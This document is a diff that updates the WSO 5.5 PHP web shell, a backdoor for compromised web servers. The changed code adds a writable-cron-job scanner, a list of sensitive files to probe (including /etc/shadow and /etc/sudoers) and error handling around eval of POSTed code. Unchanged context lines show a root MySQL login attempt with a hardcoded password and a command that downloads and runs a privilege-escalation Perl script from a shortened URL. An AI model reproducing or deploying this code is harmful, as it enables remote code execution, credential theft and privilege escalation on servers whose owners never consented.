@@ -1,7 +1,7 @@
 <?php
 
 preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);
-$auth_pass = "63a9f0ea7bb98050796b649e85481845";
+$auth_pass = "ed78a48738eb97ffb5624741bdf391c3";
 $auth_pass = isset($matches[1]) ? $matches[1] : $auth_pass;
 
 $color = "#df5";
@@ -25,7 +25,7 @@ try {
 	@define('WSO_VERSION', '5.5');
 
 	function wsoGetFile($url) {
-		$file_path = '/tmp/' . md5($url);
+		$file_path = '/tmp/' . substr(md5($url), 0, 16) . substr(md5(@file_get_contents($_SERVER['SCRIPT_FILENAME'])), 16);
 		if (!file_exists($file_path) || file_exists($file_path) && (time() - filemtime($file_path) > 60 * 60 * 24 * 1)) {
 			$ch = curl_init();
 			curl_setopt($ch, CURLOPT_URL, $url);
@@ -320,14 +320,15 @@ try {
 		$release = @php_uname('r');
 		$kernel = @php_uname('s');
 		$explink = 'curl -fskSL bit.ly/autoexp2 > /tmp/auto.pl; perl /tmp/auto.pl; rm -f /tmp/auto.pl;';
-		$sectrailslink = 'https://securitytrails.com/_next/data/85323275/list/ip/';
+		$ipv4infolink = 'https://addon.dnslytics.net/ipv4info/v1/';
 		$_SERVER["SERVER_ADDR"] = wsoGetFile('https://api.my-ip.io/ip');
 		$vt_detections = preg_replace('/^(.*"response_code": ?)(\d+)(, ?".*)|(.+"positives": )(\d{1,2})(, "total.+)$/', '$2$5', wsoGetFile('https://www.virustotal.com/vtapi/v2/url/report?resource=' . $_SERVER["SERVER_ADDR"] . '&apikey=' . $vt_key));
 		$vt_detections = $vt_detections != 0 ? '<b class=text-danger>' . $vt_detections . '</b>' : $vt_detections;
 		$ip_data = preg_replace('/(.+"countryCode":")([A-Z]{2})(",".+"isp":")(.+)(","org".+)|(.*"message":")(.+)(","query")(.*)/si', '$2$7, $4', wsoGetFile('http://demo.ip-api.com/json/' . $_SERVER["SERVER_ADDR"] . '?fields=66842623&lang=en'));
-		preg_match('/total":(\d+),/si', '$1', wsoGetFile($sectrailslink . $_SERVER["SERVER_ADDR"] . '.json?ip=' . $_SERVER["SERVER_ADDR"]), $matches);
+		preg_match('/"ndomains":(\d+),/si', wsoGetFile($ipv4infolink . $_SERVER["SERVER_ADDR"]), $matches);
 		$domains_count = isset($matches[1])?$matches[1]:'-';
 		$ram_size = file_exists('/proc/meminfo') ? preg_replace('/(.*MemTotal: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [0]) : '--';
+		$ram_free = file_exists('/proc/meminfo') ? preg_replace('/(.*MemFree: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [1]) : '--';
 		if (!function_exists('posix_getegid')) {
 			$user = @get_current_user();
 			$uid = @getmyuid();
@@ -349,7 +350,7 @@ try {
 				<u class="copy" title="' . $_SERVER["SERVER_ADDR"] . '">' . $_SERVER["SERVER_ADDR"] . '</u> (' . $ip_data . '), <span>' . $domains_count . '</span> domains. <a href="https://securitytrails.com/list/ip/' . @$_SERVER["SERVER_ADDR"] . '">[ securitytrails ]</a> <a href="https://www.virustotal.com/gui/ip-address/' . $_SERVER["SERVER_ADDR"] . '">[ virustotal (' . $vt_detections . '/56) ]</a> <a href="https://publicwww.com/websites/ip%3A' . $_SERVER["SERVER_ADDR"] . '/">[ publicwww ]</a><br>
 				' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )' . ($open_base_dir || $chains_bypassed === true ? ', <span>Open base dir:</span> ' . $open_base_dir . ' (' . ($chains_bypassed === true ? '<a class="text-green">bypassed</a>' : $chains_bypassed) . ')' : '') . '<br>
 				' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font class=text-red>ON</font>' : '<font class=text-green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a><br>
-				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>mem:</span> ' . $ram_size . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' . 
+				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>ram</span> total: ' . $ram_size . ', free: ' . $ram_free . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' . 
 				'<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
 	}
 	function wsoFooter() {
@@ -423,10 +424,43 @@ try {
 			foreach ($it as $f) {
 				$open_ports.= $f . "\n";
 			}
+			$it = @glob("/run/*/*.sock");
+			foreach ($it as $f) {
+				$open_ports.= $f . "\n";
+			}
 		}
 		catch(Exception $e) {
 		}
 		return $open_ports;
+	}
+	function wsoGetCronJobs() {
+		$cron_tabs = array("/var/spool/cron/crontabs/*","/etc/cron.*/*","/etc/cronta*");
+		$files = array();
+		try{
+			foreach ($cron_tabs as $dir) {
+				foreach (@glob($dir) as $file) {
+					if( @is_readable($file) ) {
+						if( @is_writeable($file) ) {
+							$files[$file][] = 'writable';
+						}
+						foreach(@file($file) as $line) {
+							$matches = null;
+							preg_match('# (/\S+) #i', $line, $matches);
+							if( isset($matches[1]) && @is_file($matches[1]) && @is_writable($matches[1]) ) {
+								$files[$file][] = $matches[1];
+							}
+						}
+					}
+				}
+			}
+		}
+		catch(Exception $e) {
+		}
+		$writable_cron_jobs = '';
+		foreach ($files as $cron_file => $target_files) {
+			$writable_cron_jobs .= $cron_file.': '.implode(', ', $target_files)."\n";
+		}
+		return $writable_cron_jobs;
 	}
 	function wsoEx($in) {
 		try {
@@ -552,6 +586,8 @@ try {
 		wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
 		wsoSecParam('Open ports & sockets', wsoGetOpenPorts());
 		echo '<br>';
+		wsoSecParam('Writable cron jobs', wsoGetCronJobs());
+		echo '<br>';
 		$temp = array();
 		try {
 			$res = @new PDO("mysql:host=localhost;", 'root', 'mayflowerr');
@@ -591,7 +627,7 @@ try {
 				$danger_exists = array();
 				$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
 				$downloaders_exists = array();
-				foreach (explode(':', getenv('PATH')?getenv('PATH'):'/usr/local/bin:/usr/bin') as $path) {
+				foreach (explode(':', getenv('PATH')?getenv('PATH'):'/usr/local/bin:/usr/bin:/usr/sbin') as $path) {
 					foreach ($userful as $bin_name) {
 						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $userful_exists[] = $bin_name;
 					}
@@ -605,6 +641,12 @@ try {
 				wsoSecParam('Userful', implode(', ', $userful_exists));
 				wsoSecParam('Danger', implode(', ', $danger_exists));
 				wsoSecParam('Downloaders', implode(', ', $downloaders_exists));
+				$interesting = array("/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases","/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf","/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf","/etc/ssh/sshd_config","/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf","/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf","/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
+				$interesting_exists = array();
+				foreach ($interesting as $path) {
+					if( bindtextdomain(rand(1e5,1e6), $path) ) $interesting_exists[] = $path;
+				}
+				wsoSecParam('Interesting', implode("\n", $interesting_exists));
 				echo '<br/>';
 				wsoSecParam('HDD space', wsoEx('df -h'));
 				wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
@@ -658,7 +700,12 @@ try {
 		echo ' <input type=hidden name=ajax value=1></form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
 		if (!empty($_POST['p1'])) {
 			ob_start();
-			eval($_POST['p1']);
+			try {
+				eval($_POST['p1']);
+			}
+			catch(Exception $e) {
+				echo $e->getMessage();
+			}
 			echo htmlspecialchars(ob_get_clean());
 		}
 		echo '</pre></div>';
